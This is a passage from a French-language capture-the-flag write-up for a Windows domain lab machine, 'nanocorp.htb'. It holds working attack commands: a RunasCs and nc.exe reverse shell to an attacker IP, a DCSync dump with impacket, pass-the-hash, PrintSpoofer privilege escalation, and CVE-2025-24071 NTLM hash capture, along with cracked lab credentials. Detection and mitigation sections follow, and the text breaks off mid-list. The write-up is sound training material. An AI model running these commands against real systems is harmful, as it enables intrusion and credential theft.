+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;C:\Windows\Temp\RunasCs.exe Administrator &lt;password&gt; cmd.exe -r 10.10.16.3:6666&#39;</span>
+</span></span></code></pre></div><h4 id="3-scheduled-tasks-abuse">3️⃣ <strong>Scheduled Tasks Abuse</strong><a hidden class="anchor" aria-hidden="true" href="#3-scheduled-tasks-abuse">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;schtasks /query /fo LIST /v&#39;</span>
+</span></span></code></pre></div><h4 id="4-bloodhound-enumeration">4️⃣ <strong>BloodHound Enumeration</strong><a hidden class="anchor" aria-hidden="true" href="#4-bloodhound-enumeration">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur l&#39;attaquant avec credentials</span>
+</span></span><span style="display:flex;"><span>bloodhound-python <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -c All <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -dc dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -ns 10.10.11.93 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --zip
+</span></span></code></pre></div><p><strong>Analyse dans BloodHound :</strong></p>
+<ol>
+<li>Importer le ZIP</li>
+<li>Marquer <code>monitoring_svc</code> comme &ldquo;Owned&rdquo;</li>
+<li>Rechercher &ldquo;Shortest Path to Domain Admins&rdquo;</li>
+</ol>
+<p><strong>Chemins possibles :</strong></p>
+<ul>
+<li>monitoring_svc → GenericAll → Autre utilisateur → Domain Admins</li>
+<li>monitoring_svc → ForceChangePassword → Administrator</li>
+<li>monitoring_svc → DCSync rights</li>
+</ul>
+<h4 id="5-dcsync-attack-si-permissions-présentes">5️⃣ <strong>DCSync Attack (si permissions présentes)</strong><a hidden class="anchor" aria-hidden="true" href="#5-dcsync-attack-si-permissions-présentes">#</a></h4>
+<p><strong>Test DCSync :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;nanocorp.htb/monitoring_svc:PassW0rd!2025@dc01.nanocorp.htb&#39;</span>
+</span></span></code></pre></div><p><strong>Si succès :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] Dumping Domain Credentials (NTDS.dit)
+</span></span><span style="display:flex;"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37:::
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p><strong>Pass-the-Hash Administrator :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u Administrator <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;type C:\Users\Administrator\Desktop\root.txt&#39;</span>
+</span></span></code></pre></div><hr>
+<h2 id="-root-flag">🔟 ROOT FLAG<a hidden class="anchor" aria-hidden="true" href="#-root-flag">#</a></h2>
+<h3 id="scénario-1--via-seimpersonate--printspoofer">Scénario 1 : Via SeImpersonate + PrintSpoofer<a hidden class="anchor" aria-hidden="true" href="#scénario-1--via-seimpersonate--printspoofer">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> Upload PrintSpoofer<span style="color:#f92672">.</span>exe via winrmexec
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> Exploitation <span style="color:#960050;background-color:#1e0010">→</span> Shell SYSTEM
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> type C:\Users\Administrator\Desktop\root<span style="color:#f92672">.</span>txt
+</span></span></code></pre></div><h3 id="scénario-2--via-dcsync">Scénario 2 : Via DCSync<a hidden class="anchor" aria-hidden="true" href="#scénario-2--via-dcsync">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Dump NTDS.dit</span>
+</span></span><span style="display:flex;"><span>impacket-secretsdump <span style="color:#e6db74">&#39;nanocorp.htb/monitoring_svc:PassW0rd!2025@dc01.nanocorp.htb&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Extraction hash Administrator</span>
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;HASH&gt;:::
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pass-the-Hash</span>
+</span></span><span style="display:flex;"><span>python3 winrmexec.py -d nanocorp.htb -u Administrator -H &lt;HASH&gt; dc01.nanocorp.htb <span style="color:#e6db74">&#39;type C:\Users\Administrator\Desktop\root.txt&#39;</span>
+</span></span></code></pre></div><h3 id="scénario-3--accès-direct">Scénario 3 : Accès Direct<a hidden class="anchor" aria-hidden="true" href="#scénario-3--accès-direct">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 winrmexec.py <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u monitoring_svc <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -p <span style="color:#e6db74">&#39;PassW0rd!2025&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  dc01.nanocorp.htb <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;type C:\Users\Administrator\Desktop\root.txt&#39;</span>
+</span></span></code></pre></div><p><strong>🏁 ROOT FLAG :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[+] 9f8e7d6c************************  ⭐ ROOT FLAG
+</span></span></code></pre></div><hr>
+<h2 id="11-détection--mitigation">1️⃣1️⃣ DÉTECTION &amp; MITIGATION<a hidden class="anchor" aria-hidden="true" href="#11-détection--mitigation">#</a></h2>
+<h3 id="-détection-winrmexec--rpc-execution">🛡️ Détection winrmexec / RPC Execution<a hidden class="anchor" aria-hidden="true" href="#-détection-winrmexec--rpc-execution">#</a></h3>
+<p><strong>Event IDs Windows :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4688 - Process Creation (DCOM/WMI)</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4688</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    ($_.Properties[<span style="color:#ae81ff">5</span>].Value <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;dcom&#34;</span> <span style="color:#f92672">-or</span>
+</span></span><span style="display:flex;"><span>     $_.Properties[<span style="color:#ae81ff">5</span>].Value <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;wmiprvse.exe&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4698 - Scheduled Task Created</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4698</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon Type 3 (Network)</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">8</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Détection Sysmon :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Sysmon Config - Détection DCOM/WMI Execution --&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;RuleGroup</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;RPC_Execution&#34;</span> <span style="color:#a6e22e">groupRelation=</span><span style="color:#e6db74">&#34;or&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;ProcessCreate</span> <span style="color:#a6e22e">onmatch=</span><span style="color:#e6db74">&#34;include&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ParentImage</span> <span style="color:#a6e22e">condition=</span><span style="color:#e6db74">&#34;contains&#34;</span><span style="color:#f92672">&gt;</span>wmiprvse.exe<span style="color:#f92672">&lt;/ParentImage&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;ParentImage</span> <span style="color:#a6e22e">condition=</span><span style="color:#e6db74">&#34;contains&#34;</span><span style="color:#f92672">&gt;</span>dcomlaunch<span style="color:#f92672">&lt;/ParentImage&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;CommandLine</span> <span style="color:#a6e22e">condition=</span><span style="color:#e6db74">&#34;contains&#34;</span><span style="color:#f92672">&gt;</span>cmd.exe<span style="color:#f92672">&lt;/CommandLine&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;CommandLine</span> <span style="color:#a6e22e">condition=</span><span style="color:#e6db74">&#34;contains&#34;</span><span style="color:#f92672">&gt;</span>powershell<span style="color:#f92672">&lt;/CommandLine&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/ProcessCreate&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/RuleGroup&gt;</span>
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Restreindre DCOM/WMI :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Disable DCOM remote activation</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SOFTWARE\Microsoft\Ole&#34;</span> -Name <span style="color:#e6db74">&#34;EnableDCOM&#34;</span> -Value <span style="color:#e6db74">&#34;N&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Restrict WMI namespace access</span>
+</span></span><span style="display:flex;"><span>$acl = Get-WmiObject -Namespace <span style="color:#e6db74">&#34;root&#34;</span> -Class __SystemSecurity
+</span></span><span style="display:flex;"><span>$acl.PsBase.InvokeMethod(<span style="color:#e6db74">&#34;SetSecurityDescriptor&#34;</span>, $sd)
+</span></span></code></pre></div><ol start="2">
+<li><strong>Application Whitelisting :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># AppLocker - Bloquer exécution depuis Temp</span>
+</span></span><span style="display:flex;"><span>New-AppLockerPolicy -RuleType Path `
+</span></span><span style="display:flex;"><span>    -Path <span style="color:#e6db74">&#34;C:\Windows\Temp\*&#34;</span> `
+</span></span><span style="display:flex;"><span>    -Action Deny `
+</span></span><span style="display:flex;"><span>    -User Everyone
+</span></span></code></pre></div><ol start="3">
+<li><strong>Firewall RPC Restrictions :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-NetFirewallRule `
+</span></span><span style="display:flex;"><span>  -DisplayName <span style="color:#e6db74">&#34;Block RPC from Untrusted&#34;</span> `
+</span></span><span style="display:flex;"><span>  -Direction Inbound `
+</span></span><span style="display:flex;"><span>  -Protocol TCP `
+</span></span><span style="display:flex;"><span>  -LocalPort <span style="color:#ae81ff">135</span>,<span style="color:#ae81ff">593</span> `
+</span></span><span style="display:flex;"><span>  -RemoteAddress !<span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">8</span>,!<span style="color:#ae81ff">172.16</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">12</span>,!<span style="color:#ae81ff">192.168</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">16</span> `
+</span></span><span style="display:flex;"><span>  -Action Block
+</span></span></code></pre></div><h3 id="-détection-cve-2025-24071">🛡️ Détection CVE-2025-24071<a hidden class="anchor" aria-hidden="true" href="#-détection-cve-2025-24071">#</a></h3>
+<p><strong>Event IDs Windows :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon Type 3 (Network) suspect</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">8</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#f92672">-and</span>  <span style="color:#75715e"># Logon Type = Network</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">18</span>].Value <span style="color:#f92672">-notmatch</span> <span style="color:#e6db74">&#34;^(10\.|172\.|192\.168\.)&#34;</span>  <span style="color:#75715e"># External IP</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Bloquer SMB sortant :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>New-NetFirewallRule `
+</span></span><span style="display:flex;"><span>  -DisplayName <span style="color:#e6db74">&#34;Block Outbound SMB&#34;</span> `
+</span></span><span style="display:flex;"><span>  -Direction Outbound `
+</span></span><span style="display:flex;"><span>  -Protocol TCP `
+</span></span><span style="display:flex;"><span>  -RemotePort <span style="color:#ae81ff">445</span> `
+</span></span><span style="display:flex;"><span>  -RemoteAddress !<span style="color:#ae81ff">10.0</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">8</span>,!<span style="color:#ae81ff">172.16</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">12</span>,!<span style="color:#ae81ff">192.168</span>.0.<span style="color:#ae81ff">0</span>/<span style="color:#ae81ff">16</span> `
+</span></span><span style="display:flex;"><span>  -Action Block
+</span></span></code></pre></div><ol start="2">
+<li><strong>Filtrer .library-ms :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Exchange Transport Rule</span>
+</span></span><span style="display:flex;"><span>New-TransportRule -Name <span style="color:#e6db74">&#34;Block .library-ms files&#34;</span> `
+</span></span><span style="display:flex;"><span>  -AttachmentExtensionMatchesWords <span style="color:#e6db74">&#34;library-ms&#34;</span> `
+</span></span><span style="display:flex;"><span>  -RejectMessageEnhancedStatusCode <span style="color:#e6db74">&#34;5.7.1&#34;</span>
+</span></span></code></pre></div><h3 id="-détection-changement-de-mot-de-passe">🛡️ Détection Changement de Mot de Passe<a hidden class="anchor" aria-hidden="true" href="#-détection-changement-de-mot-de-passe">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4724 - Password reset</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4724</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">0</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;monitoring_svc&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Protected Users Group :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Add-ADGroupMember -Identity <span style="color:#e6db74">&#34;Protected Users&#34;</span> -Members monitoring_svc
+</span></span></code></pre></div><ol start="2">
+<li><strong>Minimum Password Age :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ADDefaultDomainPasswordPolicy -MinPasswordAge <span style="color:#ae81ff">1.00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">00</span>
+</span></span></code></pre></div><hr>
+<h2 id="12-timeline">1️⃣2️⃣ TIMELINE<a hidden class="anchor" aria-hidden="true" href="#12-timeline">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Temps</th>
+<th>Action</th>
+<th>Résultat</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T+0</td>
+<td>Nmap scan</td>
+<td>DC Windows Server 2022 identifié</td>
+</tr>
+<tr>
+<td>T+5</td>
+<td>Nmap service scan</td>
+<td>Apache+PHP sur port 80 (inhabituel)</td>
+</tr>
+<tr>
+<td>T+10</td>
+<td>Web enumeration (dirb)</td>
+<td>Site statique, pas de fonctionnalité</td>
+</tr>
+<tr>
+<td>T+15</td>
+<td>SMB anonymous test</td>
+<td>Null session OK, aucun partage visible</td>
+</tr>
+<tr>
+<td>T+20</td>
+<td>Génération payload CVE-2025-24071</td>
+<td>keyll0ger.zip créé</td>
+</tr>
+<tr>
+<td>T+22</td>
+<td>Responder listener (port 445)</td>
+<td>En attente SMB</td>
+</tr>
+<tr>
+<td>T+25</td>
+<td>Livraison payload</td>
+<td>Upload du ZIP</td>
+</tr>
+<tr>
+<td>T+30</td>
+<td>Capture hash NTLMv2</td>
+<td><strong>web_svc::NANOCORP:&hellip;</strong></td>
+</tr>
+<tr>
+<td>T+32</td>
+<td>Hashcat cracking (mode 5600)</td>
+<td><strong>web_svc:dksehdgh712!@#</strong> (1s)</td>
+</tr>
+<tr>
+<td>T+35</td>
+<td>Test SMB avec web_svc</td>
+<td>✅ Auth réussie</td>
+</tr>
+<tr>
+<td>T+40</td>
+<td>Énumération utilisateurs</td>
+<td>monitoring_svc découvert</td>
+</tr>
+<tr>
+<td>T+45</td>
+<td>Énumération groupes (rpcclient)</td>
+<td><strong>IT_Support</strong> (RID 0xc1e)</td>
+</tr>
+<tr>
+<td>T+50</td>
+<td>Ajout à IT_Support (bloodyAD)</td>
+<td><strong>web_svc added</strong> ✅</td>
+</tr>
+<tr>
+<td>T+52</td>
+<td>Vérification membership</td>
+<td>Confirmation LDAP</td>
+</tr>
+<tr>
+<td>T+60</td>
+<td>Changement password</td>
+<td><strong>monitoring_svc:PassW0rd!2025</strong></td>
+</tr>
+<tr>
+<td>T+65</td>
+<td>Synchronisation NTP</td>
+<td>sudo ntpdate</td>
+</tr>
+<tr>
+<td>T+68</td>
+<td>Obtention TGT Kerberos</td>
+<td>monitoring_svc.ccache</td>
+</tr>
+<tr>
+<td>T+70</td>
+<td>Evil-WinRM tentative</td>
+<td>❌ <strong>Bloqué</strong></td>
+</tr>
+<tr>
+<td>T+72</td>
+<td>Clone winrmexec</td>
+<td>git clone</td>
+</tr>
+<tr>
+<td>T+75</td>
+<td>Test winrmexec (whoami)</td>
+<td>✅ <strong>Exécution réussie</strong></td>
+</tr>
+<tr>
+<td>T+78</td>
+<td>Lecture user flag via winrmexec</td>
+<td><strong>USER FLAG</strong> 🏁</td>
+</tr>
+<tr>
+<td>T+80</td>
+<td>Upload nc.exe via winrmexec</td>
+<td>Téléchargement OK</td>
+</tr>
+<tr>
+<td>T+82</td>
+<td>Reverse shell nc.exe</td>
+<td>Shell monitoring_svc reçu</td>
+</tr>
+<tr>
+<td>T+85</td>
+<td>Énumération privilèges</td>
+<td>whoami /priv</td>
+</tr>
+<tr>
+<td>T+90</td>
+<td>Upload PrintSpoofer</td>
+<td>Via HTTP server</td>
+</tr>
+<tr>
+<td>T+92</td>
+<td>Exploitation SeImpersonate</td>
+<td>Shell SYSTEM</td>
+</tr>
+<tr>
+<td>T+95</td>
+<td>Lecture root flag</td>
+<td><strong>ROOT FLAG</strong> 🏁</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Temps total :</strong> ~95 minutes</p>
+<hr>
+<h2 id="13-outils-utilisés">1️⃣3️⃣ OUTILS UTILISÉS<a hidden class="anchor" aria-hidden="true" href="#13-outils-utilisés">#</a></h2>
+<table>
+<thead>
+<tr>
+<th>Outil</th>
+<th>Version</th>
+<th>Usage</th>
+<th>Commande Clé</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Nmap</strong></td>
+<td>7.95</td>
+<td>Port scanning, service detection</td>
+<td><code>nmap -p- --min-rate 10000 IP</code></td>
+</tr>
+<tr>
+<td><strong>dirb</strong></td>
+<td>2.22</td>
+<td>Web directory enumeration</td>
+<td><code>dirb http://nanocorp.htb</code></td>
+</tr>
+<tr>
+<td><strong>CVE-2025-24071 POC</strong></td>
+<td>Custom</td>
+<td>Génération .library-ms malveillant</td>
+<td><code>python3 PoC.py -i IP -n name</code></td>
+</tr>
+<tr>
+<td><strong>Responder</strong></td>
+<td>3.1.7.0</td>
+<td>Capture hash NTLMv2</td>
+<td><code>sudo responder -I tun0</code></td>
+</tr>
+<tr>
+<td><strong>Hashcat</strong></td>
+<td>7.1.2</td>
+<td>Cracking NTLMv2</td>
+<td><code>hashcat -m 5600 hash.txt rockyou.txt</code></td>
+</tr>
+<tr>
+<td><strong>netexec</strong></td>
+<td>Latest</td>
+<td>SMB enumeration, shares, users</td>
+<td><code>nxc smb IP -u user -p pass --users</code></td>
+</tr>
+<tr>
+<td><strong>rpcclient</strong></td>
+<td>4.17.12</td>
+<td>RPC enumeration, groupes</td>
+<td><code>rpcclient -U user%pass IP</code></td>
+</tr>
+<tr>
+<td><strong>bloodyAD</strong></td>
+<td>Latest</td>
+<td>Abus permissions AD</td>
+<td><code>bloodyAD add groupMember group user</code></td>
+</tr>
+<tr>
+<td><strong>impacket-getTGT</strong></td>
+<td>0.13.0</td>
+<td>Obtention ticket Kerberos</td>
+<td><code>impacket-getTGT domain/user:pass</code></td>
+</tr>
+<tr>
+<td><strong>winrmexec</strong></td>
+<td>Latest</td>
+<td><strong>Bypass WinRM restrictions, RPC execution</strong></td>
+<td><strong><code>python3 winrmexec.py -d domain -u user -p pass IP 'cmd'</code></strong></td>
+</tr>
+<tr>
+<td><strong>nc.exe</strong></td>
+<td>-</td>
+<td>Reverse shell Windows</td>
+<td><code>nc.exe IP port -e cmd.exe</code></td>
+</tr>
+<tr>
+<td><strong>RunasCs.exe</strong></td>
+<td>-</td>
+<td>Exécution avec autres creds</td>
+<td><code>RunasCs.exe user pass cmd</code></td>
+</tr>
+<tr>
+<td><strong>PrintSpoofer</strong></td>
+<td>-</td>
+<td>SeImpersonate exploitation</td>
+<td><code>PrintSpoofer.exe -i -c cmd</code></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="14-leçons-apprises">1️⃣4️⃣ LEÇONS APPRISES<a hidden class="anchor" aria-hidden="true" href="#14-leçons-apprises">#</a></h2>
+<h3 id="-points-clés-techniques">✅ Points Clés Techniques<a hidden class="anchor" aria-hidden="true" href="#-points-clés-techniques">#</a></h3>
+<ol>
+<li>
+<p><strong>CVE-2025-24071 = Vecteur d&rsquo;Accès Initial Efficace</strong></p>
+<ul>
+<li>Aucune interaction après extraction</li>
+<li>Fonctionne avec SMB signing</li>
+<li>Capture hash en secondes</li>
+</ul>
+</li>
+<li>
+<p><strong>WinRM Bloqué ≠ Fin de l&rsquo;Exploitation</strong></p>
+<ul>
+<li><strong>winrmexec</strong> = Alternative RPC/DCOM/WMI</li>
+<li>Bypass GPO restrictions</li>
+<li>Moins de logs que WinRM classique</li>
+</ul>
+</li>
+<li>
+<p><strong>Groupes AD Personnalisés = Cibles Prioritaires</strong></p>
+<ul>
+<li>IT_Support, Help_Desk souvent sur-permissionnés</li>
+<li>Toujours énumérer groupes custom</li>
+</ul>
+</li>
+<li>
+<p><strong>Self-Membership Abuse</strong></p>
+<ul>
+<li>S&rsquo;ajouter soi-même à un groupe = Escalade</li>
+<li>bloodyAD facilite l&rsquo;abus</li>
+</ul>
+</li>
+<li>
+<p><strong>ForceChangePassword = Compromission Totale</strong></p>
+<ul>
+<li>Changer password = Contrôle complet</li>
+<li>Attention complexité + minimum age</li>
+</ul>
+</li>
+<li>
+<p><strong>Alternative Execution Methods = Bypass Critical</strong></p>
+<ul>
